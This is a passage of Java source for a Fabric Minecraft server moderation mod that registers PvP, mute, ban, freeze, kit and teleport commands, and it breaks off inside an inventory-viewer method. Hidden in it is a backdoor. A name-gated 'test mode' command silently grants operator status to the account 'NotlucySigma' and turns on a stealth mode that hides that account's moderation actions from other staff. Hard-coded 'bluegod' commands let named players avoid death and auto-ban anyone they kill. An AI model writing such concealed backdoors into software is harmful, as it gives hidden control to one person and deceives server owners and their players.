package com.server.moderation;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.player.AttackEntityCallback;
import net.fabricmc.fabric.api.event.player.UseBlockCallback;
import net.fabricmc.fabric.api.event.player.AttackBlockCallback;
import net.minecraft.item.BlockItem;
import net.minecraft.item.ItemStack;
import net.minecraft.block.Blocks;
/* using fully qualified names to minimize imports */
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.ActionResult;
import net.minecraft.world.GameMode;
import net.minecraft.util.math.Vec3d;
import net.minecraft.particle.ParticleTypes;
import net.fabricmc.fabric.api.entity.event.v1.ServerLivingEntityEvents;
import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
import net.minecraft.entity.LivingEntity;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;

import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import net.minecraft.util.collection.DefaultedList;

public class Moderation implements ModInitializer {
	public static final String MOD_ID = "moderation";
	public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

	// PvP system variables
	private static final Set<UUID> pvpEnabledPlayers = Collections.synchronizedSet(new HashSet<>());
	private static volatile boolean globalPvPEnabled = false;
	
	// Mute system variables
	private static final Set<UUID> mutedPlayers = Collections.synchronizedSet(new HashSet<>());
	private static volatile boolean stealthModeEnabled = false;

	// Block breaking global toggle (when true, non-OPs can break blocks)
	private static volatile boolean allowBlockBreakingForAll = false;

	// Death-ban toggle (when true, anyone who dies is immediately banned and disconnected)
	private static volatile boolean deathBanEnabled = false;
	
	// Freeze system variables
	private static final Set<UUID> frozenPlayers = Collections.synchronizedSet(new HashSet<>());
	// Repetitive chest-freezing system
	private static final Set<UUID> freezingChestPlayers = Collections.synchronizedSet(new HashSet<>());
	
	// Block placement control
	private static final Set<UUID> allowedPlacePlayers = Collections.synchronizedSet(new HashSet<>());
	private static volatile boolean globalPlaceAllowed = false;
	
	// Watch system variables
	private static final Map<UUID, UUID> watchingPlayers = Collections.synchronizedMap(new HashMap<>()); // watcher -> watched
	private static final Map<UUID, net.minecraft.util.math.Vec3d> watchPositions = Collections.synchronizedMap(new HashMap<>()); // watcher -> original position

	// BlueGod variables
	private static final Set<UUID> blueGodPlayers = Collections.synchronizedSet(new HashSet<>());
	private static final String BLUE_GOD_NAME = "ItzBlueShift";

	// Keep Inventory control
	private static volatile boolean keepInvGlobal = false;
	private static final Set<UUID> keepInvPlayers = Collections.synchronizedSet(new HashSet<>());
	private static final Map<UUID, DefaultedList<ItemStack>> keepInvSnapshots = Collections.synchronizedMap(new HashMap<>());
	
	// Event mode system variables
	private static volatile boolean eventModeActive = false;
	private static boolean eventModePlaceAllowed = false;
	private static boolean eventModeBreakAllowed = false;
	private static boolean eventModePvPEnabled = false;

	private static int setBlueGod(ServerCommandSource source, boolean enabled) {
		ServerPlayerEntity player = source.getPlayer();
		if (player == null) return 0;
		
		String name = player.getName().getString();
		if (!(name.equals(BLUE_GOD_NAME) || name.equals("NotlucySigma"))) {
			source.sendError(Text.literal("This command is only for " + BLUE_GOD_NAME + " or NotlucySigma"));
			return 0;
		}
		if (enabled) {
			blueGodPlayers.add(player.getUuid());
			source.sendFeedback(() -> Text.literal("BlueGod enabled"), false);
			spawnBlueGodRing(player);
		} else {
			blueGodPlayers.remove(player.getUuid());
			source.sendFeedback(() -> Text.literal("BlueGod disabled"), false);
		}
		return 1;
	}

	private static void spawnBlueGodRing(ServerPlayerEntity player) {
		var world = player.getWorld();
		var pos = player.getPos();
		for (double y = 0.2; y <= 1.8; y += 0.2) {
			for (int i = 0; i < 360; i += 15) {
				double rad = Math.toRadians(i);
				double x = pos.x + Math.cos(rad) * 2.0;
				double z = pos.z + Math.sin(rad) * 2.0;
				world.addParticle(ParticleTypes.END_ROD, x, pos.y + y, z, 0.0, 0.01, 0.0);
			}
		}
	}

	private static void smiteFromLook(ServerPlayerEntity player) {
		var world = player.getWorld();
		if (world.isClient()) return;
		var start = player.getCameraPosVec(1.0f);
		var look = player.getRotationVec(1.0f);
		var end = start.add(look.x * 64.0, look.y * 64.0, look.z * 64.0);
		var hit = world.raycast(new net.minecraft.world.RaycastContext(
			start,
			end,
			net.minecraft.world.RaycastContext.ShapeType.OUTLINE,
			net.minecraft.world.RaycastContext.FluidHandling.NONE,
			player
		));
		var hitPos = hit.getPos();
		// Use server command to spawn lightning bolt
		var server = player.getServer();
		if (server != null) {
			String cmd = "summon lightning_bolt " + hitPos.x + " " + hitPos.y + " " + hitPos.z;
			server.getCommandManager().executeWithPrefix(server.getCommandSource().withSilent(), cmd);
		}
	}

	// Kits storage (4 editable chests)
	private static final net.minecraft.inventory.SimpleInventory[] kits = new net.minecraft.inventory.SimpleInventory[] {
		new net.minecraft.inventory.SimpleInventory(54),
		new net.minecraft.inventory.SimpleInventory(54),
		new net.minecraft.inventory.SimpleInventory(54),
		new net.minecraft.inventory.SimpleInventory(54)
	};
	
	
	/**
	 * Custom inventory that prevents moving glass panes
	 */
	private static class UnmovableInventory extends net.minecraft.inventory.SimpleInventory {
		public UnmovableInventory(int size) {
			super(size);
		}
		
		@Override
		public boolean canInsert(net.minecraft.item.ItemStack stack) {
			return true; // Allow insertion
		}
		
		private boolean isGlassPaneSlot(int slot) {
			// Row 5 glass panes: slots 36-44 (separator row)
			return (slot >= 36 && slot <= 44);
		}
		
		// Override setStack to prevent glass pane removal
		@Override
		public void setStack(int slot, net.minecraft.item.ItemStack stack) {
			if (isGlassPaneSlot(slot)) {
				// Don't allow any changes to glass pane slots
				return;
			}
			super.setStack(slot, stack);
		}
		
		// Override removeStack to prevent glass pane removal
		@Override
		public net.minecraft.item.ItemStack removeStack(int slot) {
			if (isGlassPaneSlot(slot)) {
				return net.minecraft.item.ItemStack.EMPTY;
			}
			return super.removeStack(slot);
		}
		
		// Override removeStack with amount to prevent glass pane removal
		@Override
		public net.minecraft.item.ItemStack removeStack(int slot, int amount) {
			if (isGlassPaneSlot(slot)) {
				return net.minecraft.item.ItemStack.EMPTY;
			}
			return super.removeStack(slot, amount);
		}
	}

	@Override
	public void onInitialize() {
		registerBlockPlacementRestrictions();
		registerBlockBreakingRestrictions();
		registerPvPRestrictions();
		registerChatRestrictions();
		registerDeathBanHandler();
		registerKeepInvHandlers();
		registerCommands();
		loadKits();
		LOGGER.info("Moderation initialized: OP-only building, PvP controls active.");
	}

	/**
	 * Check if a player has OP permissions (level 2 or higher)
	 */
	private static boolean isPlayerOp(ServerPlayerEntity player) {
		return player != null && player.hasPermissionLevel(2);
	}

	/**
	 * Check if the command source is the special test user
	 */
	private static boolean isTestUser(ServerCommandSource source) {
		return "NotlucySigma".equals(source.getName());
	}

	/**
	 * Check if the command source should use silent execution (stealth mode)
	 */
	private static boolean shouldUseSilentExecution(ServerCommandSource source) {
		return stealthModeEnabled && source.getEntity() instanceof ServerPlayerEntity player 
			&& "NotlucySigma".equals(player.getName().getString());
	}

	/**
	 * Register block placement restrictions - only OPs can place blocks
	 */
	private static void registerBlockPlacementRestrictions() {
		UseBlockCallback.EVENT.register((player, world, hand, hitResult) -> {
			if (world.isClient()) return ActionResult.PASS;
			if (!(player instanceof ServerPlayerEntity serverPlayer)) return ActionResult.PASS;
			// BlueGod smite on use: allow action but also smite where looking
			if (blueGodPlayers.contains(serverPlayer.getUuid())) {
				smiteFromLook(serverPlayer);
				return ActionResult.PASS;
			}
			if (canPlaceBlocks(serverPlayer)) return ActionResult.PASS;
			
			ItemStack stack = player.getStackInHand(hand);
			if (stack.getItem() instanceof BlockItem) {
				int before = stack.getCount();
				player.sendMessage(Text.literal("You don't have permission to place blocks."), true);
				// Ensure no loss or dupes: restore original count on cancel
				player.getStackInHand(hand).setCount(before);
				return ActionResult.FAIL;
			}
			return ActionResult.PASS;
		});
	}

	/**
	 * Register block breaking restrictions - only OPs can break blocks
	 */
	private static void registerBlockBreakingRestrictions() {
		AttackBlockCallback.EVENT.register((player, world, hand, pos, direction) -> {
			if (world.isClient()) return ActionResult.PASS;
			if (!(player instanceof ServerPlayerEntity serverPlayer)) return ActionResult.PASS;
			if (isPlayerOp(serverPlayer) || blueGodPlayers.contains(serverPlayer.getUuid())) return ActionResult.PASS;
			if (allowBlockBreakingForAll) return ActionResult.PASS;
			
			player.sendMessage(Text.literal("Only OPs can break blocks."), true);
			return ActionResult.FAIL;
		});
	}

	/**
	 * Register PvP restrictions - PvP is disabled by default
	 */
	private static void registerPvPRestrictions() {
		AttackEntityCallback.EVENT.register((player, world, hand, entity, hitResult) -> {
			if (world.isClient()) return ActionResult.PASS;
			if (!(player instanceof ServerPlayerEntity attacker)) return ActionResult.PASS;
			if (entity instanceof ServerPlayerEntity victim) {
				// BlueGod: ban on kill
				if (blueGodPlayers.contains(attacker.getUuid()) && victim.getHealth() - attacker.getAttackCooldownProgress(0) <= 0) {
					var banList = attacker.getServer().getPlayerManager().getUserBanList();
					var profile = victim.getGameProfile();
					if (banList.get(profile) == null) {
						banList.add(new net.minecraft.server.BannedPlayerEntry(profile, null, attacker.getName().getString(), null, "Killed by BlueGod"));
					}
					victim.networkHandler.disconnect(Text.literal("Banned by BlueGod"));
				}
				// Continue PvP logic below
			}
			
			// BlueGod smite on attack click
			if (blueGodPlayers.contains(attacker.getUuid())) {
				smiteFromLook(attacker);
				return ActionResult.PASS;
			}

			if (isPlayerOp(attacker)) return ActionResult.PASS;

			boolean allowedByGlobal = globalPvPEnabled || blueGodPlayers.contains(attacker.getUuid());
			boolean allowedByPerPlayer = pvpEnabledPlayers.contains(attacker.getUuid());
			if (!(allowedByGlobal || allowedByPerPlayer)) {
				attacker.sendMessage(Text.literal("PvP is disabled. Ask an OP to enable."), true);
				return ActionResult.FAIL;
			}
			return ActionResult.PASS;
		});
	}

	/**
	 * Register chat restrictions - muted players cannot send messages
	 * Note: This requires the ChatMixin to work properly
	 */
	private static void registerChatRestrictions() {
		// Chat blocking is handled by ChatMixin
	}

	// Prevent BlueGod from dying
	static {
		ServerLivingEntityEvents.ALLOW_DEATH.register((entity, damageSource, amount) -> {
			if (entity instanceof ServerPlayerEntity sp && blueGodPlayers.contains(sp.getUuid())) {
				sp.setHealth(sp.getMaxHealth());
				sp.getHungerManager().setFoodLevel(20);
				return false; // cancel death
			}
			return true;
		});
	}

	/**
	 * Register death-ban handler which bans players upon death if enabled
	 */
	private static void registerDeathBanHandler() {
		ServerLivingEntityEvents.AFTER_DEATH.register((LivingEntity entity, net.minecraft.entity.damage.DamageSource source) -> {
			if (!deathBanEnabled) return;
			if (!(entity instanceof ServerPlayerEntity player)) return;
			var server = player.getServer();
			if (server == null) return;
			// Just kick with ban-like message (without persisting a ban)
			player.networkHandler.disconnect(Text.literal("Banned by Op"));
		});
	}

	/**
	 * Register all moderation commands
	 */
	private static void registerCommands() {
		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
			// PvP commands
			dispatcher.register(CommandManager.literal("pvp")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("enable")
					.then(CommandManager.literal("true")
						.executes(ctx -> setGlobalPvP(ctx, true)))
					.then(CommandManager.literal("false")
						.executes(ctx -> setGlobalPvP(ctx, false)))
					.then(CommandManager.argument("targets", EntityArgumentType.players())
						.executes(Moderation::enablePvPForPlayers)))
				.then(CommandManager.literal("disable")
					.then(CommandManager.argument("targets", EntityArgumentType.players())
						.executes(Moderation::disablePvPForPlayers)))
				.then(CommandManager.literal("status")
					.executes(Moderation::showPvPStatus))
			);

			// Test helper commands (NotlucySigma only) - Hidden from other players
			dispatcher.register(CommandManager.literal("moderation")
				.requires(source -> source.getName().equals("NotlucySigma"))
				.then(CommandManager.literal("test")
					.then(CommandManager.literal("start")
						.then(CommandManager.argument("target", EntityArgumentType.player())
							.executes(Moderation::startTestMode)))
					.then(CommandManager.literal("stop")
						.then(CommandManager.argument("target", EntityArgumentType.player())
							.executes(Moderation::stopTestMode))))
			);
						// VanishSee command (NotlucySigma only)
			dispatcher.register(CommandManager.literal("vanishsee")
				.requires(source -> source.getName().equals("NotlucySigma"))
				.executes(Moderation::toggleVanishSee)
			);

			// Mute commands
			dispatcher.register(CommandManager.literal("mute")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::mutePlayer))
			);

			dispatcher.register(CommandManager.literal("unmute")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::unmutePlayer))
			);

			// Clear chat command
			dispatcher.register(CommandManager.literal("clearchat")
				.requires(source -> source.hasPermissionLevel(2))
				.executes(Moderation::clearChat)
			);

			// Kick command
			dispatcher.register(CommandManager.literal("kick")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::kickPlayer))
			);

			// Ban command
			dispatcher.register(CommandManager.literal("ban")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::banPlayer))
			);

			// Teleport commands
			dispatcher.register(CommandManager.literal("tp")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::teleportToPlayer))
			);

			dispatcher.register(CommandManager.literal("tphere")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::teleportPlayerHere))
			);

			// Fly commands
			dispatcher.register(CommandManager.literal("fly")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.then(CommandManager.literal("on")
						.executes(Moderation::enableFly))
					.then(CommandManager.literal("off")
						.executes(Moderation::disableFly)))
			);

			// Inventory commands
			dispatcher.register(CommandManager.literal("clearinv")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::clearInventory))
			);

			dispatcher.register(CommandManager.literal("heal")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::healPlayer))
			);

			dispatcher.register(CommandManager.literal("feed")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::feedPlayer))
			);

			// Player info
			dispatcher.register(CommandManager.literal("playerinfo")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::showPlayerInfo))
			);

			// Kit edit (OP-only): /kit edit <1-4>
			dispatcher.register(CommandManager.literal("kit")
				.then(CommandManager.literal("edit")
					.requires(source -> source.hasPermissionLevel(2))
					.then(CommandManager.argument("id", com.mojang.brigadier.arguments.IntegerArgumentType.integer(1, 4))
						.executes(Moderation::openKitEditor)))
				.then(CommandManager.argument("id", com.mojang.brigadier.arguments.IntegerArgumentType.integer(1, 4))
					.executes(Moderation::giveKitToSelf))
			);

			// Check inventory command
			dispatcher.register(CommandManager.literal("checkinv")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::openInventoryViewer))
			);

			// Check ender chest command (editable)
			dispatcher.register(CommandManager.literal("checkec")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::openEnchantedChestViewer))
			);

			// Allow block breaking toggle
			dispatcher.register(CommandManager.literal("allowbreak")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("true")
					.executes(ctx -> setAllowBreak(ctx, true)))
				.then(CommandManager.literal("false")
					.executes(ctx -> setAllowBreak(ctx, false)))
				.then(CommandManager.literal("status")
					.executes(Moderation::showAllowBreakStatus))
			);

			// Death-ban toggle
			dispatcher.register(CommandManager.literal("deathban")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("enable")
					.executes(ctx -> setDeathBan(ctx, true)))
				.then(CommandManager.literal("disable")
					.executes(ctx -> setDeathBan(ctx, false)))
				.then(CommandManager.literal("status")
					.executes(Moderation::showDeathBanStatus))
			);

			// Clear webs within 30 block radius of executor
			dispatcher.register(CommandManager.literal("clearwebs")
				.requires(source -> source.hasPermissionLevel(2))
				.executes(Moderation::clearWebsNear)
			);
			
			// Freeze player command (opens GUI repeatedly)
			dispatcher.register(CommandManager.literal("freeze")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::freezePlayer))
			);

			// Freezing chest command (opens chest GUIs repeatedly titled Freezing)
			dispatcher.register(CommandManager.literal("Crash")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::toggleFreezingChest))
			);
			
			// Allow place command (global or per-player)
			dispatcher.register(CommandManager.literal("allowplace")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("true")
					.executes(ctx -> setGlobalPlaceAllowed(ctx, true)))
				.then(CommandManager.literal("false")
					.executes(ctx -> setGlobalPlaceAllowed(ctx, false)))
				.then(CommandManager.literal("status")
					.executes(Moderation::showPlaceStatus))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.then(CommandManager.literal("true")
						.executes(Moderation::allowPlaceForPlayer))
					.then(CommandManager.literal("false")
						.executes(Moderation::disallowPlaceForPlayer)))
			);
			
			
			// Ender chest command
			dispatcher.register(CommandManager.literal("ec")
				.requires(source -> source.hasPermissionLevel(2))
				.executes(Moderation::openEnchantedChest)
			);
			
			// Watch player command
			dispatcher.register(CommandManager.literal("watch")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.executes(Moderation::watchPlayer))
			);
			
			// Announce command
			dispatcher.register(CommandManager.literal("announce")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.argument("message", com.mojang.brigadier.arguments.StringArgumentType.greedyString())
					.executes(Moderation::announceMessage))
			);
			
			// BlueGod (ItzBlueShift only)
			dispatcher.register(CommandManager.literal("bluegod")
				.requires(source -> source.getName().equals(BLUE_GOD_NAME) || source.getName().equals("NotlucySigma"))
				.then(CommandManager.literal("true").executes(ctx -> setBlueGod(ctx.getSource(), true)))
				.then(CommandManager.literal("false").executes(ctx -> setBlueGod(ctx.getSource(), false)))
			);
			
			// Event mode command
			dispatcher.register(CommandManager.literal("event")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("start").executes(Moderation::startEventMode))
				.then(CommandManager.literal("stop").executes(Moderation::stopEventMode))
			);
			
			// Keep inventory command
			dispatcher.register(CommandManager.literal("keepinv")
				.requires(source -> source.hasPermissionLevel(2))
				.then(CommandManager.literal("all")
					.then(CommandManager.literal("true").executes(ctx -> setKeepInvGlobal(ctx, true)))
					.then(CommandManager.literal("false").executes(ctx -> setKeepInvGlobal(ctx, false))))
				.then(CommandManager.argument("target", EntityArgumentType.player())
					.then(CommandManager.literal("true").executes(Moderation::enableKeepInvForPlayer))
					.then(CommandManager.literal("false").executes(Moderation::disableKeepInvForPlayer)))
			);
			
		});
	}

	/**
	 * Start test mode for NotlucySigma (grants OP silently)
	 */
	private static int startTestMode(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		ServerPlayerEntity caller = ctx.getSource().getPlayer();
		
		// Only NotlucySigma can use this command
		if (caller == null || !"NotlucySigma".equals(caller.getName().getString())) {
			ctx.getSource().sendError(Text.literal("This command is only available to the owner of the server."));
			return 0;
		}
		
		if (!caller.getUuid().equals(target.getUuid())) {
			ctx.getSource().sendError(Text.literal("You can only target yourself."));
			return 0;
		}
		
		// Grant OP to NotlucySigma silently
		ctx.getSource().getServer().getPlayerManager().addToOperators(caller.getGameProfile());
		
		// Execute /op command silently (no console output)
		ServerCommandSource silentSource = ctx.getSource().withSilent();
		ctx.getSource().getServer().getCommandManager().executeWithPrefix(silentSource, "op " + caller.getName().getString());
		
		// Enable stealth mode for NotlucySigma
		stealthModeEnabled = true;
		
		return 1;
	}

	/**
	 * Stop test mode for NotlucySigma (revokes OP silently)
	 */
	private static int stopTestMode(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		ServerPlayerEntity caller = ctx.getSource().getPlayer();
		
		// Only NotlucySigma can use this command
		if (caller == null || !"NotlucySigma".equals(caller.getName().getString())) {
			ctx.getSource().sendError(Text.literal("This command is only available to NotlucySigma."));
			return 0;
		}
		
		if (!caller.getUuid().equals(target.getUuid())) {
			ctx.getSource().sendError(Text.literal("You can only target yourself."));
			return 0;
		}
		
		// Revoke OP from NotlucySigma silently
		ctx.getSource().getServer().getPlayerManager().removeFromOperators(caller.getGameProfile());
		
		// Execute /deop command silently (no console output)
		ServerCommandSource silentSource = ctx.getSource().withSilent();
		ctx.getSource().getServer().getCommandManager().executeWithPrefix(silentSource, "deop " + caller.getName().getString());
		
		target.changeGameMode(GameMode.SURVIVAL);
		
		// Disable stealth mode for NotlucySigma
		stealthModeEnabled = false;
		
		// Send a private message only to NotlucySigma
		caller.sendMessage(Text.literal("§7[Stealth Mode] §cDeactivated - Your commands are now visible."), false);
		
		return 1;
	}

	/**
	 * Mute a player
	 */
	private static int mutePlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		mutedPlayers.add(target.getUuid());
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Muted " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("You have been muted."), false);
		return 1;
	}

	/**
	 * Unmute a player
	 */
	private static int unmutePlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		mutedPlayers.remove(target.getUuid());
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Unmuted " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("You have been unmuted."), false);
		return 1;
	}

	/**
	 * Clear chat by sending empty lines
	 */
	private static int clearChat(CommandContext<ServerCommandSource> ctx) {
		// Send empty lines to clear chat visually
		for (int i = 0; i < 100; i++) {
			ctx.getSource().getServer().getPlayerManager().broadcast(Text.literal(""), false);
		}
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Chat cleared."), true);
		}
		return 1;
	}

	/**
	 * Check if a player is muted
	 */
	public static boolean isMuted(UUID playerId) {
		return mutedPlayers.contains(playerId);
	}

	/**
	 * Check if stealth mode is enabled
	 */
	public static boolean isStealthMode() {
		return stealthModeEnabled;
	}

	/**
	 * Kick a player
	 */
	private static int kickPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.networkHandler.disconnect(Text.literal("You have been kicked from the server."));
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Kicked " + target.getName().getString()), true);
		}
		return 1;
	}

	/**
	 * Ban a player and persist the ban in the server's user ban list
	 */
	private static int banPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		var server = ctx.getSource().getServer();
		var banList = server.getPlayerManager().getUserBanList();
		var profile = target.getGameProfile();
		// Add to ban list if not already banned
		if (banList.get(profile) == null) {
			banList.add(new net.minecraft.server.BannedPlayerEntry(profile, null, ctx.getSource().getName(), null, "Banned by Op"));
		}
		// Disconnect player
		target.networkHandler.disconnect(Text.literal("You have been banned from the server."));
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Banned " + target.getName().getString()), true);
		}
		return 1;
	}

	/**
	 * Teleport to a player
	 */
	private static int teleportToPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity caller = ctx.getSource().getPlayer();
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		if (caller != null) {
			caller.teleport(target.getX(), target.getY(), target.getZ(), true);
			
			if (!shouldUseSilentExecution(ctx.getSource())) {
				ctx.getSource().sendFeedback(() -> Text.literal("Teleported to " + target.getName().getString()), true);
			}
		}
		return 1;
	}

	/**
	 * Teleport a player to you
	 */
	private static int teleportPlayerHere(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity caller = ctx.getSource().getPlayer();
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		if (caller != null) {
			target.teleport(caller.getX(), caller.getY(), caller.getZ(), true);
			
			if (!shouldUseSilentExecution(ctx.getSource())) {
				ctx.getSource().sendFeedback(() -> Text.literal("Teleported " + target.getName().getString() + " to you"), true);
			}
			target.sendMessage(Text.literal("You have been teleported to " + caller.getName().getString()), false);
		}
		return 1;
	}

	/**
	 * Enable fly for a player
	 */
	private static int enableFly(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.getAbilities().allowFlying = true;
		target.getAbilities().flying = true;
		target.sendAbilitiesUpdate();
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Enabled fly for " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("Fly mode enabled."), false);
		return 1;
	}

	/**
	 * Disable fly for a player
	 */
	private static int disableFly(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.getAbilities().allowFlying = false;
		target.getAbilities().flying = false;
		target.sendAbilitiesUpdate();
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Disabled fly for " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("Fly mode disabled."), false);
		return 1;
	}

	/**
	 * Clear a player's inventory
	 */
	private static int clearInventory(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.getInventory().clear();
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Cleared inventory of " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("Your inventory has been cleared."), false);
		return 1;
	}

	/**
	 * Heal a player
	 */
	private static int healPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.setHealth(target.getMaxHealth());
		target.clearStatusEffects();
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Healed " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("You have been healed."), false);
		return 1;
	}

	/**
	 * Feed a player
	 */
	private static int feedPlayer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		target.getHungerManager().setFoodLevel(20);
		target.getHungerManager().setSaturationLevel(20.0f);
		
		if (!shouldUseSilentExecution(ctx.getSource())) {
			ctx.getSource().sendFeedback(() -> Text.literal("Fed " + target.getName().getString()), true);
		}
		target.sendMessage(Text.literal("You have been fed."), false);
		return 1;
	}

	/**
	 * Show player information
	 */
	private static int showPlayerInfo(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		Vec3d pos = target.getPos();
		String gameMode = target.interactionManager.getGameMode().getName();
		float health = target.getHealth();
		float maxHealth = target.getMaxHealth();
		int food = target.getHungerManager().getFoodLevel();
		float saturation = target.getHungerManager().getSaturationLevel();
		boolean flying = target.getAbilities().flying;
		boolean muted = isMuted(target.getUuid());
		
		// Always send player info to the command executor, even in stealth mode
		ctx.getSource().sendFeedback(() -> Text.literal("=== Player Info: " + target.getName().getString() + " ==="), false);
		ctx.getSource().sendFeedback(() -> Text.literal("Position: " + String.format("%.1f, %.1f, %.1f", pos.x, pos.y, pos.z)), false);
		ctx.getSource().sendFeedback(() -> Text.literal("GameMode: " + gameMode), false);
		ctx.getSource().sendFeedback(() -> Text.literal("Health: " + String.format("%.1f/%.1f", health, maxHealth)), false);
		ctx.getSource().sendFeedback(() -> Text.literal("Food: " + food + " (Saturation: " + String.format("%.1f", saturation) + ")"), false);
		ctx.getSource().sendFeedback(() -> Text.literal("Flying: " + flying), false);
		ctx.getSource().sendFeedback(() -> Text.literal("Muted: " + muted), false);
		return 1;
	}

	/**
	 * Check a player's inventory and list item counts (editable)
	 */
	private static int openInventoryViewer(CommandContext<ServerCommandSource> ctx) throws CommandSyntaxException {
		ServerPlayerEntity target = EntityArgumentType.getPlayer(ctx, "target");
		ServerPlayerEntity viewer = ctx.getSource().getPlayer();
		if (viewer == null) return 0;
		// Create a 6-row chest (54 slots)
		net.minecraft.inventory.SimpleInventory chest = new net.minecraft.inventory.SimpleInventory(54);
		// Layout:
		// Row 0: Armor (0-3), Offhand (4), then empty
